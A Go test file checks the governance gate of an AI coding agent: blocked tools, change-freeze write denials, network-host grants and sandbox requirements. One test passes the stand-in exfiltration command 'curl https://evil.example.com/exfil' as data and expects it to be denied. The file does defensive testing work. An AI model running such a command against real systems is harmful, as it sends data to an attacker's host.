package control

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
	"time"

	"patty/internal/agent"
	"patty/internal/approvals"
	"patty/internal/event"
	"patty/internal/governed"
	"patty/internal/permission"
	"patty/internal/sandbox"
	"patty/internal/workflow"
)

// newGovernedTestController builds a controller with an executor
// wired the same way an interactive session is. The base policy
// allows bash so governance — not the permission posture — is the
// layer under test.
func newGovernedTestController(t *testing.T) (*Controller, *agent.Agent) {
	t.Helper()
	session := agent.NewSession("sys")
	exec := agent.New(nil, nil, session, agent.Options{}, event.Discard)
	pol := permission.Policy{Mode: permission.Allow}
	pol.Allow = []permission.Rule{{Tool: "bash"}, {Tool: "write_file"}}
	c := New(Options{Executor: exec, Policy: pol})
	c.EnableInteractiveApproval()
	return c, exec
}

// TestGovernanceStateBlocksToolThroughExecutorGate is the C3
// integration boundary: with a governance state installed, a tool
// the relay's registry marks BLOCKED must be denied at the
// executor's gate — the same path every real tool call takes.
func TestGovernanceStateBlocksToolThroughExecutorGate(t *testing.T) {
	c, exec := newGovernedTestController(t)

	reg := approvals.NewRegistry()
	reg.SetTools([]*approvals.ToolRegistration{
		{ToolID: "write_file", Status: approvals.StatusBlocked},
	}, time.Now().UnixMilli())
	state := governed.NewState()
	state.SetRegistry(reg)
	c.SetGovernanceState(state)

	allow, reason, err := exec.CurrentGate().Check(context.Background(), "write_file", json.RawMessage(`{"path":"a.go","content":"x"}`), false)
	if err != nil {
		t.Fatalf("Check: %v", err)
	}
	if allow {
		t.Fatal("blocked tool must be denied through the executor gate")
	}
	if !strings.Contains(reason, "PCCP governance") {
		t.Errorf("reason must cite governance policy, got %q", reason)
	}
	if !strings.Contains(reason, "차단") {
		t.Errorf("reason must surface the Korean explanation, got %q", reason)
	}
}

// TestGovernanceStateFreezeBlocksWrites covers D3: an active
// change-freeze on the session's repo must reject AI writes with
// the Korean reason while read-only calls still pass the
// governance layer.
func TestGovernanceStateFreezeBlocksWrites(t *testing.T) {
	c, exec := newGovernedTestController(t)

	gates := workflow.NewGatesClient("org-test", "2.0.0", "stable")
	gates.SetFreeze(&workflow.ChangeFreeze{
		OrganizationID: "org-test",
		Reason:         "year-end freeze",
		ReasonKo:       "연말 변경 동결",
		AffectedRepos:  []string{"repo-test"},
		StartedAt:      time.Now().Add(-time.Minute),
		NotAfter:       time.Now().Add(time.Hour),
	})
	state := governed.NewState()
	state.SetGates(gates)
	state.SetContext("repo-test", "model-x")
	c.SetGovernanceState(state)

	gate := exec.CurrentGate()

	// A read-only call passes the governance layer (the freeze
	// permits read/review/test). The base policy may still have its
	// own opinion, but the freeze must not be the blocker.
	_, readReason, err := gate.Check(context.Background(), "bash", json.RawMessage(`{"command":"go test ./..."}`), true)
	if err != nil {
		t.Fatalf("read-only Check: %v", err)
	}
	if strings.Contains(readReason, "동결") || strings.Contains(readReason, "governance") {
		t.Fatalf("read-only call must not be freeze-denied, got %q", readReason)
	}

	// Writes are governance-denied with the freeze reason.
	allow, reason, err := gate.Check(context.Background(), "write_file", json.RawMessage(`{"path":"a.go","content":"x"}`), false)
	if err != nil {
		t.Fatalf("write Check: %v", err)
	}
	if allow {
		t.Fatal("write under change-freeze must be denied")
	}
	if !strings.Contains(reason, "동결") {
		t.Errorf("freeze reason must surface the Korean explanation, got %q", reason)
	}
}

// TestGovernanceStateNetworkGrantBlocksCurlHost covers C4: a
// shell command dialing an un-granted host must be denied
// (fail-closed broker).
func TestGovernanceStateNetworkGrantBlocksCurlHost(t *testing.T) {
	c, exec := newGovernedTestController(t)

	reg := approvals.NewRegistry()
	reg.SetTools([]*approvals.ToolRegistration{
		// The broker is fail-closed on unregistered tools, so a
		// deployed registry must register the shell tool too.
		{ToolID: "bash", Status: approvals.StatusApproved},
	}, time.Now().UnixMilli())
	reg.SetNetworkGrants([]*approvals.NetworkGrant{
		{HostPattern: "api.internal.example", TokenBudget: 100},
	})
	state := governed.NewState()
	state.SetRegistry(reg)
	c.SetGovernanceState(state)

	allow, reason, err := exec.CurrentGate().Check(context.Background(), "bash", json.RawMessage(`{"command":"curl https://evil.example.com/exfil"}`), false)
	if err != nil {
		t.Fatalf("Check: %v", err)
	}
	if allow {
		t.Fatal("curl to un-granted host must be denied")
	}
	if !strings.Contains(reason, "PCCP governance") {
		t.Errorf("reason must cite governance policy, got %q", reason)
	}

	// The granted host passes the governance layer.
	allow, _, err = exec.CurrentGate().Check(context.Background(), "bash", json.RawMessage(`{"command":"curl https://api.internal.example/v1/ping"}`), false)
	if err != nil {
		t.Fatalf("granted Check: %v", err)
	}
	if !allow {
		t.Fatal("curl to granted host must pass governance")
	}
}

// TestGovernanceStateSandboxBaselineBlocksLocalExec covers E4: a
// sensitive repo requires the remote sandbox; local shell exec is
// denied.
func TestGovernanceStateSandboxBaselineBlocksLocalExec(t *testing.T) {
	c, exec := newGovernedTestController(t)

	store := sandbox.NewPolicyStore()
	store.Set(&sandbox.Policy{
		OrganizationID: "org-test",
		RepositoryID:   "repo-gov",
		Mode:           sandbox.ModeRemoteOnly,
		RiskClass:      sandbox.RiskSensitive,
	})
	state := governed.NewState()
	state.SetSandboxPolicy(store)
	state.SetContext("repo-gov", "model-x")
	c.SetGovernanceState(state)

	allow, _, err := exec.CurrentGate().Check(context.Background(), "bash", json.RawMessage(`{"command":"ls -la"}`), false)
	if err != nil {
		t.Fatalf("Check: %v", err)
	}
	if allow {
		t.Fatal("local exec on sensitive repo must be denied")
	}
}

// TestGovernanceStateNilIsPassThrough covers the
// local-development boundary: without a governance state, gate
// behavior is unchanged (base policy decides).
func TestGovernanceStateNilIsPassThrough(t *testing.T) {
	_, exec := newGovernedTestController(t)

	allow, _, err := exec.CurrentGate().Check(context.Background(), "write_file", json.RawMessage(`{"path":"a.go"}`), false)
	if err != nil {
		t.Fatalf("Check: %v", err)
	}
	if !allow {
		t.Fatal("nil governance state must not block; base policy decides")
	}
}
